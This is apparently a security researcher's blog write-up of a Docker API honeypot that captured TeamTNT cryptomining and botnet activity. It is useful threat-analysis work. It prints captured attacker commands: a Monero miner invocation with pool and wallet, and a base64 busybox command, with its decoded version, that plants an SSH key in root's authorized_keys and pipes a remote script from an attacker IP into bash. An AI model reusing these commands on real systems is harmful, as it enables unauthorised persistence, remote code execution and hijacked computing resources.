---
title: "Using a Honeypot to Capture TeamTNT Activity"
description: "This idea came from a combination of an Intezer guide on building a honeypot and a Sysdig article on triaging malicious Docker containers. I decided to test it myself and stood up an EC2 instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container. The actual telemetry was gathered using Intezer Analyze and Intezer Protect which provided some great context into the activity as I didn't have a personal SIEM configured to source logs."
pubDate: 2022-06-23T09:48:00.000-06:00
updatedDate: 2025-10-29T14:31:37.000-06:00
heroImage: "/images/2025/10/DSCF0936.jpg"
heroImageCaption: "Colorado in the Fall"
tags: []
---

This idea came from a combination of an Intezer guide on building a honeypot and a Sysdig article on triaging malicious Docker containers. I decided to test it myself and stood up an EC2 instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container. The actual telemetry was gathered using Intezer Analyze and Intezer Protect which provided some great context into the activity as I didn't have a personal SIEM configured to source logs.

*   Port 22 is locked to my WAN IP only
*   I exposed the Docker API port 2375 which is also useful for tools like Portainer

Not even a few hours after making the Docker API port public, I got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-2.png" class="kg-image" alt="" loading="lazy" width="1968" height="180"></figure>

Activity between 10pm 2/9 and 04:32am 2/10

<figure class="kg-card kg-image-card"><img src="/images/2025/10/alerts.jpg" class="kg-image" alt="" loading="lazy" width="2000" height="476"></figure>

I found that one of these alerts dealt with a new Docker container “risible\_oxter.” More on that later but for context, I only installed an Alpine container. The others weren’t a concern as they immediately exited and eventually removed.

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Capture.jpg" class="kg-image" alt="" loading="lazy" width="1054" height="140"></figure>

### Cetus

From the Intezer screenshot above, it can be seen that Cetus, an XMR miner, is the culprit which created the risible\_oxter container.

The `containerd-shim-run-v2` command is a shim API for runtime. After downloading, they use `portainer` to run the risible\_oxter container.

Execution Time: 10 Feb 22 | 04:24

SHA256: b49a3f3cb4c70014e2c35c880d47bc475584b87b7dfcfa6d7341d42a16ebe443

Process Tree:

```bash
/sbin/init
	/usr/bin/containerd-shim-runc-v2 -namespace moby -id 8f01c6e6c82aa76d2eb7a4671bcea039e5a01b89bd0edff8ce1acf3146abd300 -address /run/containerd/containerd.sock
		/bin/bash
			/usr/bin/portainer risible_oxter
```

*   Container was executed at 04:18
*   Related sample to TeamTNT

New activity was observed while writing this. The container is now defining an actual pool address with additional parameters. The `utmp.log` showed mining activity and hardware info.

```bash
docker-cache -B --donate-level 1 -o pool.minexmr.com:443 -u 85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh -k --tls -t 1 --rig-id risible_oxter -l /var/log/utmp.log
```

*   Connects to 94\[.\]130\[.\]164\[.\]163:443

### Generic Malware

Execution Time: 09 Feb 22 | 22:06

SHA256: 0d95f767c5f828695761e199b6e0b9fe62ace2902221540a33d331859648e761

Process Tree:

```bash
/sbin/init
	/var/tmp/.copydie/[kswapd0] --config=/var/tmp/.copydie/[kswapd0].pid
```

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-1-1.png" class="kg-image" alt="" loading="lazy" width="2000" height="146"></figure>

Malicious file opened. Another Monero coinminer

`cat` output of `/var/tmp/.copydie/[kswapd0].pid`

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-2-1.png" class="kg-image" alt="" loading="lazy" width="408" height="566"></figure>

*   `[kswapd0]` is a stripped executable so I couldn’t view strings.

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-3.png" class="kg-image" alt="" loading="lazy" width="709" height="114"></figure>

### Tsunami

Tsunami was interesting because it only launched a single executable `bioset`. After looking through the file, I noticed some strings that were of interest, Ziggy Startux and a lot of config strings.

Execution Time: 09 Feb 22 | 22:06

SHA256: 6574b93062974e287a65798dca6f6efd2bc8f8e376baa6efa69ddfc719acf8d9

Process Tree:

```bash
/sbin/init
	/bioset
```

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-4.png" class="kg-image" alt="" loading="lazy" width="1060" height="1243"></figure>

Turns out it’s a TeamTNT botnet.

*   [TeamTNT Builds Botnet from Chinese Cloud Servers - Lacework](https://www.lacework.com/blog/teamtnt-builds-botnet-from-chinese-cloud-servers/)

Network Connections

<table data-line="113" class="code-line" dir="auto" style="border-collapse: collapse; margin-bottom: 0.7em; position: relative; color: rgb(212, 212, 212); font-family: -apple-system, &quot;system-ui&quot;, &quot;Segoe WPC&quot;, &quot;Segoe UI&quot;, system-ui, Ubuntu, &quot;Droid Sans&quot;, sans-serif; font-size: 14px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><thead data-line="113" class="code-line" dir="auto" style="position: relative;"><tr data-line="113" class="code-line" dir="auto" style="position: relative;"><th style="text-align: left; border-bottom: 1px solid rgba(255, 255, 255, 0.69); padding: 5px 10px; border-top-color: rgba(255, 255, 255, 0.69); border-right-color: rgba(255, 255, 255, 0.69); border-left-color: rgba(255, 255, 255, 0.69);">Local Address</th><th style="text-align: left; border-bottom: 1px solid rgba(255, 255, 255, 0.69); padding: 5px 10px; border-top-color: rgba(255, 255, 255, 0.69); border-right-color: rgba(255, 255, 255, 0.69); border-left-color: rgba(255, 255, 255, 0.69);">Foreign Address</th></tr></thead><tbody data-line="115" class="code-line" dir="auto" style="position: relative;"><tr data-line="115" class="code-line" dir="auto" style="position: relative;"><td style="padding: 5px 10px; border-color: rgba(255, 255, 255, 0.18);">172[.]31[.]94[.]144:56862</td><td style="padding: 5px 10px; border-color: rgba(255, 255, 255, 0.18);">159[.]75[.]18[.]13:3667</td></tr></tbody></table>

Some further attribution tying the Tsunami sample to TeamTNT based on similar strings.

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-5.png" class="kg-image" alt="" loading="lazy" width="1264" height="428"></figure>

### TeamTNT

TeamTNT first sets up their own ssh key and moves the private key to `/tmp/TeamTNT`

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-6.png" class="kg-image" alt="" loading="lazy" width="2000" height="265"></figure>

<figure class="kg-card kg-image-card"><img src="/images/2025/10/Untitled-7.png" class="kg-image" alt="" loading="lazy" width="970" height="478"></figure>

Initially uses busybox to launch a base64 encoded command and with that copies their public key to the `authorized_keys` folder for persistence. With an active connection, I believe this is how the Ziggy Startux botnet gets installed.

```bash
/bin/busybox

`chroot /host bash -c echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA== | base64 -d | bash`
```

Decoded output

```bash
ssh-keygen -N "" -f /tmp/TeamTNT
mkdir -p /root/.ssh
chattr -R -ia /root/.ssh/ 2>/dev/null; tntrecht -R -ia /root/.ssh/ 2>/dev/null; ichdarf -R -ia /root/.ssh/ 2>/dev/null
cat /tmp/TeamTNT.pub >> /root/.ssh/authorized_keys
cat /tmp/TeamTNT.pub > /root/.ssh/authorized_keys2
rm -f /tmp/TeamTNT.pub

ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i /tmp/TeamTNT root@127.0.0.1 "(curl http://104[.]192[.]82[.]138/s3f1015/b/a.sh||cd1 http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wget -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wd1 -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh)|bash"
```

The analysis ends here after not seeing any further activity carried out, at least in a favorable amount of time. This investigation proved a point at just how fast malicious activity can be carried out when making services public to the open internet.

**Update 10-29-2025**: I revisited this post after many years and wanted to see how prevalent this threat still is. I built a Censys query to monitor for servers exposing the Docker port 2375 and found 42 hosts still exist.

`(host.services.port: 2375 and host.services.software.product="docker") and not host.services.labels.value = "HONEYPOT"`

### References

*   [https://sysdig.com/blog/triaging-malicious-docker-container/](https://sysdig.com/blog/triaging-malicious-docker-container/)
*   [https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/](https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/)
*   [https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124](https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124)
*   [https://hub.docker.com/\_/alpine](https://hub.docker.com/_/alpine)
